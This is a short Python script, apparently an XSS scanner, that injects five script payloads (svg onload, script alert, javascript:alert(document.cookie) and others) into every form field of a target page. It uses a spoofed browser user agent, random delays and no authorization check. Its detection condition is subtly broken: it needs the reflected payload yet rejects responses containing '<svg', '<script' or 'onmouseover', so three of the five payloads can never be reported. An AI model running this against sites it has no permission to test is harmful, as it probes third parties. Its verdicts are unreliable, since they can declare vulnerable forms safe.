import time
import random
import requests
from bs4 import BeautifulSoup
from colorama import Fore
import re
from urllib.parse import urljoin, urlencode

def scan(url: str):
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})

    try:
        response = session.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"{Fore.RED}Error accessing the URL: {e}")
        return

    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")

    payloads = [
        '"><svg onload=alert(1)>',
        '<script>alert(1)</script>',
        'javascript:alert(document.cookie)',
        '"onmouseover="alert(1)',
        '\\"-alert(1)}//']

    xss_found = []
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(url, action) if action else url

        inputs = form.find_all("input")
        data = {input_field.get("name"): input_field.get("value", "") for input_field in inputs if input_field.get("name")}

        for payload in payloads:
            for input_name in data.keys():
                test_data = data.copy()
                test_data[input_name] = payload

                try:
                    if method == "post":
                        response = session.post(form_url, data=test_data)
                    else:
                        response = session.get(form_url, params=test_data)
                    
                    response.raise_for_status()
                except requests.RequestException:
                    continue

                if payload in response.text and not re.search(r'<svg|<script|onmouseover', response.text, re.IGNORECASE):
                    xss_found.append((payload, form_url, input_name))
                    
                    with open("output/xss.txt", "a") as f:
                        f.write(f"--Vulnerable Form--\n\n")
                        f.write(f"URL: {form_url}\n")
                        f.write(f"Method: {method.upper()}\n")
                        f.write(f"Input: {input_name}\n")
                        f.write(f"Payload: {payload}\n\n")
                        f.write(f"{form}\n\n")

            time.sleep(random.uniform(0.5, 1.5))  # Add a random delay between requests

    if xss_found:
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Found: {Fore.MAGENTA}{len(xss_found)}")
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Vulnerable Forms: {Fore.MAGENTA}saved to /output/xss.txt")
    else:
        print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No XSS vulnerabilities found.")
